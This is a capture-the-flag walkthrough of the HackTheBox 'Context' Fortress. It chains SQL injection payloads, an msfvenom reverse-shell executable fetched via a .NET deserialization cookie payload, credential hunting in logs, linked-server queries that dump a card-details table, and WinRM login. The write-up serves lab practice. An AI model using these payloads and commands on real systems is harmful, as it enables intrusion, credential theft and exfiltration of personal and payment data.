# **Context - HackTheBox Fortress**

*Target Ip. Address: 10.13.37.12*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.13.37.12
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 10:59 +0545
Nmap scan report for 10.13.37.12
Host is up (0.37s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
443/tcp  open  https?
| ssl-cert: Subject: commonName=WEB
| Subject Alternative Name: DNS:WEB, DNS:WEB.TEIGNTON.HTB
| Not valid before: 2025-10-13T09:12:27
|_Not valid after:  2030-10-13T09:12:27
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-info: 
|   10.13.37.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.13.37.12:1433: 
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h00m11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.55 seconds
```

So, this is a windows-based challenge. we have 4 open ports. Port 443 (https), Port 1433 (MS-SQL), Port 3389 (RDP service), Port 5985 (Winrm service).

Let's add hostname and computer name in our hosts file.

```bash
kali@kali:cat /etc/hosts
10.13.37.12     TEIGNTON.HTB WEB.TEIGNTON.HTB

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's head to the website at port 443.

<img width="1139" height="946" alt="Screenshot 2026-02-25 111148" src="https://github.com/user-attachments/assets/c397a0f3-80ae-4c72-a2c0-3386278a609f" />

We find our first flag and credentials at the source code.

```credentials
jay.teignton:a...n
```
```flag
Flag1: CONTEXT{s3.....ty}
```

We login with the credentials we found, and we have a management page.

<img width="1143" height="946" alt="image" src="https://github.com/user-attachments/assets/56658a3e-4d8b-4493-b911-dc4a6b5db85a" />

Add new product likely seems to be vulnerable to SQLi. We will try some payloads to test that.

```payload
'+(select db_name())+'
```

<img width="1246" height="981" alt="Screenshot 2026-02-25 145116" src="https://github.com/user-attachments/assets/8c69b89d-0f51-4b15-b11b-b7e156e058d0" />

That was success. We can try to get the usernames and passwords using this.

```payload
'+(select top 1 username from users order by username)+'
```
```payload
'+(select top 1 password from users order by username)+'  
```

Using this method we recover the username and password.

```credentials
abbie.buckfast:AM...f?
```

Let's search for flag as well.

```payload
'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'
```
```flag
Flag2: CONTEXT{d0.....it}
```

We have the credentials, let's search for any endpoints we can use this in.

```bash
kali@kali:dirb https://web.teignton.htb/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Feb 25 11:27:15 2026
URL_BASE: https://web.teignton.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://web.teignton.htb/ ----
+ https://web.teignton.htb/admin (CODE:200|SIZE:2879)
+ https://web.teignton.htb/Admin (CODE:200|SIZE:2879)
+ https://web.teignton.htb/ADMIN (CODE:200|SIZE:2879)
+ https://web.teignton.htb/api (CODE:401|SIZE:0)
+ https://web.teignton.htb/autodiscover (CODE:401|SIZE:0)
+ https://web.teignton.htb/ews (CODE:401|SIZE:0)
+ https://web.teignton.htb/favicon.ico (CODE:200|SIZE:32038)
+ https://web.teignton.htb/home (CODE:200|SIZE:2548)
+ https://web.teignton.htb/Home (CODE:200|SIZE:2548)
+ https://web.teignton.htb/owa (CODE:302|SIZE:215)
+ https://web.teignton.htb/rpc (CODE:401|SIZE:0)
                                                                                                                                          
-----------------
END_TIME: Wed Feb 25 12:10:56 2026
DOWNLOADED: 4612 - FOUND: 11
``

The /owa endpoint seems interesting.

<img width="1143" height="956" alt="Screenshot 2026-02-25 113559" src="https://github.com/user-attachments/assets/314d521c-cfb7-49a5-be48-da7e448d6444" />

This was outlook account login page. Let's try with the credentials we have.

There are no emails that may help us, but it has a feature to open other's mailbox.

<img width="1145" height="977" alt="Screenshot 2026-02-25 114435" src="https://github.com/user-attachments/assets/a5a4d14b-e22d-46ef-b1c1-801d10ca8cb2" />

<img width="1140" height="983" alt="Screenshot 2026-02-25 114525" src="https://github.com/user-attachments/assets/be58ab3e-b3ab-4029-bb6c-52ff44dfe21a" />

We find the entire source code of the web application. Let's download it.

<img width="1146" height="981" alt="image" src="https://github.com/user-attachments/assets/adb820aa-61d6-4b5c-a82a-5659ff2b8137" />

We find another flag as well.

```flag
Flag3: CONTEXT{wh.....0u?}
```

Let's review the source code to see if we find anything interesting.

<img width="1919" height="1079" alt="Screenshot 2026-02-25 115134" src="https://github.com/user-attachments/assets/fb331719-5d8c-4b5b-a58a-a3362993b329" />

We have a very interesting find, we see that Profile cookie is getting serialized, we can abuse this to get RCE.

Let's create a reverse shell payload with msfvenom. I suggest to keep a unique name for payload to aoid collision as this is multi-player instance.

```bash
kali@kali:msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.15 LPORT=4444 -f exe -o s83ll.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1869 bytes
Final size of exe file: 8704 bytes
Saved as: s83ll.exe
```

Start a listener to host our payload.

```bash
kali@kali:python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

We will be using ysoserial.exe to generate the payloads. It is better to use it on windows instance. You can get it from "*https://github.com/pwntester/ysoserial.net*".

Also, Windows Defender will mark this as malicious and quarantine it. So, create a folder and put it on exclusions. Remeber to remove this after you complete this challenge.

```powershell
PS C:\Users\r---k\Downloads\Pentest\Release_Archive\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.10.16.15:9000/s83ll.exe -o C:\ProgramData\s83ll.exe"
ew0KICAgICd.....gIH0NCn0=
```

Create a new cookie named 'Profile' and add the base6d encode output we got above as value for that cookie.

<img width="1139" height="943" alt="Screenshot 2026-02-25 122756" src="https://github.com/user-attachments/assets/17bfd5ef-9eda-4fd2-9490-0978e28f5c40" />

Refresh the page, it will download the payload from our python server.

```bash
kali@kali:python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.13.37.12 - - [25/Feb/2026 12:27:36] "GET /s83ll.exe HTTP/1.1" 200 -
```

That was a success. Now, start a listener at the port specified in the payload.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.78 • 172.17.0.1 • 172.18.0.1 • 10.10.16.15
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Now, generate a base64 encoded payload to run the reverse shell payload we uploaded to get a reverse shell back.


```powershell
PS C:\Users\r----k\Downloads\Pentest\Release_Archive\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\s83ll.exe"
ew0KICAgI.....B9DQp9
```

Similarly, add the new base64 encoded payload in the Profile cookie and refresh the page.

<img width="1144" height="982" alt="Screenshot 2026-02-25 122942" src="https://github.com/user-attachments/assets/0720c4ed-004a-410d-9b2f-5c3d12fd21d6" />

Should receive the reverse shell connection.

```bash
kali@kali:penelope -p 9001[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.78 • 172.17.0.1 • 172.18.0.1 • 10.10.16.15
➤  🏠 Main Menu (m) 💀Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from WEB~10.13.37.12-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D
[+] Logging to /home/kali/.penelope/sessions/WEB~10.13.37.12-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_25-12_46_11-796.log 📜

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\system32> whoami
teignton\web_user
```

We get a shell as user web_user.

We find a flag also.

```powershell
PS C:\users\Public> cat flag.txt
CONTEXT{uN.....r8}
```

```flag
Flag4: CONTEXT{uN.....r8}
```

Let's enumerate further to see if we find anything interesting.

```powershell
PS C:\Logs\WEBDB> dir

    Directory: C:\Logs\WEBDB

Mode                LastWriteTime         Length Name                                              
----                -------------         ------ ----                                              
-a----       30/04/2020     15:42          16962 ERRORLOG                                          
-a----       30/04/2020     15:41          38740 ERRORLOG.1                                        
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688578520000.xel        
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688633370000.xel        
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688733830000.xel        
-a----       27/04/2020     14:57          70144 HkEngineEventFile_0_132324694642170000.xel        
-a----       27/04/2020     15:09          70144 HkEngineEventFile_0_132324701496760000.xel        
-a----       28/04/2020     11:11          70144 HkEngineEventFile_0_132325422936270000.xel        
-a----       29/04/2020     15:23          70144 HkEngineEventFile_0_132326437911670000.xel        
-a----       29/04/2020     16:04          70144 HkEngineEventFile_0_132326462946300000.xel        
-a----       29/04/2020     16:08          70144 HkEngineEventFile_0_132326464955870000.xel        
-a----       30/04/2020     09:55          70144 HkEngineEventFile_0_132327105065260000.xel        
-a----       30/04/2020     10:15          70144 HkEngineEventFile_0_132327117227960000.xel        
-a----       30/04/2020     10:56          70144 HkEngineEventFile_0_132327142045910000.xel        
-a----       30/04/2020     12:33          70144 HkEngineEventFile_0_132327199844110000.xel        
-a----       30/04/2020     14:45          70144 HkEngineEventFile_0_132327279504690000.xel        
-a----       30/04/2020     15:41          70144 HkEngineEventFile_0_132327312839890000.xel        
-a----       30/04/2020     10:55        1048576 log_10.trc                                        
-a----       30/04/2020     11:34        1048576 log_11.trc                                        
-a----       30/04/2020     14:45        1048576 log_12.trc                                        
-a----       30/04/2020     15:41        1048576 log_13.trc                                        
-a----       30/04/2020     15:41           2560 log_14.trc                                        
-a----       30/04/2020     11:34         130048 system_health_0_132327142055920000.xel            
-a----       30/04/2020     14:45         160768 system_health_0_132327199872080000.xel            
-a----       30/04/2020     15:41         131072 system_health_0_132327279509840000.xel            
-a----       30/04/2020     15:41          98816 system_health_0_132327312844270000.xel 
```

We find some log files. It may sometimes contain the credentials as well. Let's try to hunt for credentials.

```powershell
PS C:\Logs\WEBDB> Get-ChildItem -File | Select-String "TEIGNTON"

ERRORLOG:60:2020-04-30 15:41:24.57 Server      The SQL Server Network Interface library could not 
register the Service Principal Name (SPN) [ MSSQLSvc/WEB.teignton.htb:WEBDB ] for the SQL Server 
service. Windows return code: 0x2098, state: 15. Failure to register a SPN might cause integrated 
.
.
.
.
.
????E??telemetry_xevents#????????2????W4???TEIGNTON\WEB$B???
log_13.trc:19:????????????????????????????????????????TEIGNTON\karl.memaybe
                                                                           ??????????
??#????????3???@????????????????????????????????????????????????????????????????????????
?????????????????????????????????????????????????????????????????????????????????????
log_13.trc:20:????????????????????????????????????????B6......2A
.
.
.
```

That was successful. We find the credentials for user 'karl.memaybe'. 

```credentials
karl.memaybe:B6.....2A
```

Let's check if these credentials can be used for MS-SQL.

```bash
kali@kali:impacket-mssqlclient 10.13.37.12/karl.memaybe:'B6...2A'@10.13.37.12 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WEB\WEBDB): Line 1: Changed database context to 'master'.
[*] INFO(WEB\WEBDB): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019  (15.0.2070)
[!] Press help for extra shell commands
SQL (TEIGNTON\karl.memaybe  guest@master)> 
```

Those were the valid credentials. Let's enumerate further to get some inforamtion.

```bash
SQL (TEIGNTON\karl.memaybe  guest@master)> select name from sysdatabases;
name     
------   
master   
tempdb   
model    
msdb     
webapp   
SQL (TEIGNTON\karl.memaybe  guest@master)> use webapp;
ERROR(WEB\WEBDB): Line 1: The server principal "TEIGNTON\karl.memaybe" is not able to access the database "webapp" under the current security context.
SQL (TEIGNTON\karl.memaybe  guest@master)>
```

we find some databases, but we can no access to read them.

```
SQL (TEIGNTON\karl.memaybe  guest@master)> select @@servername;
            
---------   
WEB\WEBDB   
SQL (TEIGNTON\karl.memaybe  guest@master)> select srvname from sysservers;
srvname       
-----------   
WEB\CLIENTS   
WEB\WEBDB     
SQL (TEIGNTON\karl.memaybe  guest@master)> select * from openquery([web\clients], 'select @@servername;'); 
              
-----------   
WEB\CLIENTS   
SQL (TEIGNTON\karl.memaybe  guest@master)> select * from openquery([web\clients], 'select name from sysdatabases;');
name      
-------   
master    
tempdb    
model     
msdb      
clients
```

Great !!! We find a linked server, let's see if we have required permissions to read this.

```bash
SQL (TEIGNTON\karl.memaybe  guest@master)> SELECT * FROM [WEB\CLIENTS].clients.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME     TABLE_TYPE   
-------------   ------------   ------------   ----------   
clients         dbo            card_details   b'BASE TABLE'
```

We have access to read this database.

```bash
SQL (TEIGNTON\karl.memaybe  guest@master)> SELECT * FROM [WEB\CLIENTS].clients.dbo.card_details;
name                                        company                   email                                 card_number                        security_code                 
-----------------------------------------   -----------------------   -----------------------------------   --------------------------------   ---------------------------   
b'Nicholas Vincent'                         b'Fletcher'               b' Stark and Hayes'                   b'tammy94@yahoo.com'               b'675919323062,442'           
b'Shannon Forbes'                           b'Cordova'                b' Hunt and Murphy'                   b'anna94@yahoo.com'                b'4869626801314,711'          
b'Natalie Zhang'                            b'Richardson'             b' Evans and Miles'                   b'kyle92@gmail.com'                b'4650283842902,168'
.
.
.
.
.
```

It has a very long output, let's copy that and use sublime text editor to look properly.

<img width="1228" height="857" alt="Screenshot 2026-02-25 153801" src="https://github.com/user-attachments/assets/2f6120b2-bc4f-4e00-8dad-181faf2a7492" />

We find another flag in here.

```flag
Flag5: CONTEXT{g1.....1t}
```

That been done, let's extract the raw binary (DLL) of a compiled .NET assembly from the remote database to decompile it for hidden credentials or exploit logic.

```bash
SQL (TEIGNTON\karl.memaybe  guest@master)> select cast (N'' as xml).value('xs:base64Binary(sql:column("content"))','varchar(max)') as data from openquery([web\clients], 'select * from clients.sys.assembly_files;') order by content desc offset 1 rows;
data                                                                                                                                                                                                                                                              
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b'TVqQAAMAAAAEAAAA//8AALgA.....AAAAAAA'
```

Let's put the decoded value of this base64 encoded blob into a dll file for analysis.

```bash
echo "TVqQAAMAAAAEAAAA//8AAL.....AAAAAAAAAAA" | base64 -d > decoded.dll
```
```bash
kali@kali:file decoded.dll
decoded.dll: PE32 executable for MS Windows 4.00 (DLL), Intel i386 Mono/.Net assembly, 3 sections
```

Now, we have a DLL file, we can analyze using any tools of choice. I will use monodis for this.

```bash
kali@kali:monodis decoded.dll
.assembly extern mscorlib
{
  .ver 4:0:0:0
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\V.4..
}
.
.
.
.
.
```

Let's put the output in a file and analyze it.

<img width="1220" height="853" alt="Screenshot 2026-02-25 154556" src="https://github.com/user-attachments/assets/6d96955c-c517-415a-b0a3-e7fa52df9af3" />

We find the credentials for user 'jay.teignton'.

```credentials
jay.teignton:D0...y!
```

Let's check if this users has permissions to execute remote PowerShell commands and gain a full interactive shell via the WinRM (Windows Remote Management) service.

```bash
kali@kali:nxc winrm 10.13.37.12 -u jay.teignton -p 'D0...y!'                                                                     
WINRM       10.13.37.12     5985   WEB              [*] Windows 10 / Server 2019 Build 17763 (name:WEB) (domain:TEIGNTON.HTB) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.13.37.12     5985   WEB              [+] TEIGNTON.HTB\jay.teignton:D0...y! (Pwn3d!)
```

Finally Pwn3d!!! We can now login via evil-winrm.

```bash
kali@kali:evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0...3y!'
                                  
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> whoami
teignton\jay.teignton
```

There is WindowsService.exe on Documents folder, let's download that to analyze it.

```bash
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> download WindowsService.exe
Info: Downloading C:\Users\jay.teignton\Documents\WindowsService.exe to WindowsService.exe
Info: Download successful!
```

Let's decompile it using monodis.

```bash
kali@kali:monodis WindowsService.exe
.assembly extern mscorlib
{
  .ver 4:0:0:0
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 ) // .z\V.4..
}
.
.
.
.
.
```

<img width="1230" height="588" alt="Screenshot 2026-02-25 155417" src="https://github.com/user-attachments/assets/92942fcb-60ab-4897-8979-ec6687fa4076" />

At the end of the decompiled output, we notice hex characters. Let's decode it.

```bash
kali@kali:echo "43 4F ..... 6E 7D" | xxd -r -p
CONTEXT{l0.....un}
```

We got another flag, last flag to go.

```flag
Flag6: CONTEXT{l0.....un}
```

Let's get back on to our evil-wirm session to check our privileges.

```bash
*Evil-WinRM* PS C:\Users\jay.teignton\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

What !!! Let's check our groups.

```bash
*Evil-WinRM* PS C:\Users\jay.teignton\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

We are already a Local Administrator on this box (as shown by BUILTIN\Administrators in your groups). 

Are we not supposed to escalate ??? Anyways. Let's get the final flag and end this challenge.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> type flag.txt
CONTEXT{OU.....?}
```

```flag
Flag7: CONTEXT{OU.....t?}
```
